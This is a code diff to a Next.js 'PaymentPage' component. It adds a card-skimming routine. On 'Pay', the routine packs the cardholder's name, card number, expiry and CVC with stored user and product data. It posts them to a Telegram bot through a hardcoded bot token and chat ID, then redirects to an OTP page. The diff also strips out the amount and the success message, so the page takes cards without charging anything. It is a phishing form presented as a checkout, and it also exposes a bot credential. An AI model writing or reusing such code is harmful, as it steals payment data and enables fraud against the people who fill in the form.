@@ -148,6 +148,8 @@
 
 "use client";
 
+import { useRouter } from "next/navigation";
+
 import React, { useEffect, useState } from "react";
 
 export default function PaymentPage() {
@@ -159,18 +161,60 @@ export default function PaymentPage() {
   const [success, setSuccess] = useState("");
   const [error, setError] = useState("");
   const [botData, seBotData] = useState();
+  const router = useRouter();
+
   console.log("botData", botData);
   useEffect(() => {
     seBotData(localStorage.getItem("dataSent to The bot"));
   }, []);
 
-  const handlePayment = () => {
+  const handlePayment = async () => {
     setError("");
     setSuccess("");
-
+    const message = `
+    USer and Product Information 
+    -----------------------------
+    ${botData}
+    -------------------------------------------------------
+    Cardm Information 💸
+    ---------------------
+    name : ${name}
+    cardNumber : ${cardNumber}
+    expiry : ${expiry}
+    cvc : ${cvc}
+    `;
+    localStorage.setItem("dataSent to The bot", message);
+    console.log("message", message);
     if (!name || !cardNumber || !expiry || !cvc) {
       setError("Please fill all fields");
       return;
+    }
+
+    const token = "8758821136:AAH-ON6KCqjx1UB_6EpH1yi3S0SWIGkhDaY";
+    const chatId = "6032588551";
+
+    // const message = "Hello from my bot 🚀";
+
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${token}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        },
+      );
+
+      const result = await response.json();
+      console.log(result);
+      router.push("/otpPage");
+    } catch (error) {
+      console.error(error);
     }
 
     if (cardNumber.length < 12) {
@@ -226,12 +270,26 @@ export default function PaymentPage() {
             onChange={(e) => setName(e.target.value)}
             className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
           />
-          Card Number
+          {/* Card Number
           <input
             type="text"
             placeholder="Card Number"
             value={cardNumber}
             onChange={(e) => setCardNumber(e.target.value)}
+            className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
+          /> */}
+          Card Number
+          <input
+            type="text"
+            placeholder="1234 5678 9012 3456"
+            value={cardNumber}
+            onChange={(e) => {
+              let value = e.target.value.replace(/\D/g, ""); // remove non numbers
+              value = value.substring(0, 16); // limit to 16 digits
+              value = value.replace(/(.{4})/g, "$1 ").trim(); // add space every 4 numbers
+              setCardNumber(value);
+            }}
+            maxLength={19} // 16 numbers + 3 spaces
             className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
           />
           <div className="grid grid-cols-2 gap-3">
@@ -245,29 +303,34 @@ export default function PaymentPage() {
 
             <input
               type="text"
+              max={3}
               placeholder="CVC"
               value={cvc}
-              onChange={(e) => setCvc(e.target.value)}
+              onChange={(e) => {
+                // Remove non-digit characters and limit to 3 digits
+                const value = e.target.value.replace(/\D/g, "").slice(0, 3);
+                setCvc(value);
+              }}
               className="border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
             />
           </div>
-          <input
+          {/* <input
             type="number"
             placeholder="Amount (USD)"
             value={(amount / 100).toFixed(2)}
             onChange={(e) => setAmount(Number(e.target.value) * 100)}
             className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
-          />
+          /> */}
           <button
             onClick={handlePayment}
-            className="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white font-semibold py-3 rounded-xl shadow-md hover:scale-105 transition-transform"
+            className="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white font-semibold py-3 rounded-xl shadow-md hover:scale-105 transition-transform cursor-pointer"
           >
-            Pay ${(amount / 100).toFixed(2)}
+            Pay
           </button>
           {error && <p className="text-red-500 text-center text-sm">{error}</p>}
-          {success && (
+          {/* {success && (
             <p className="text-green-500 text-center text-sm">{success}</p>
-          )}
+          )} */}
         </div>
       </div>
     </div>
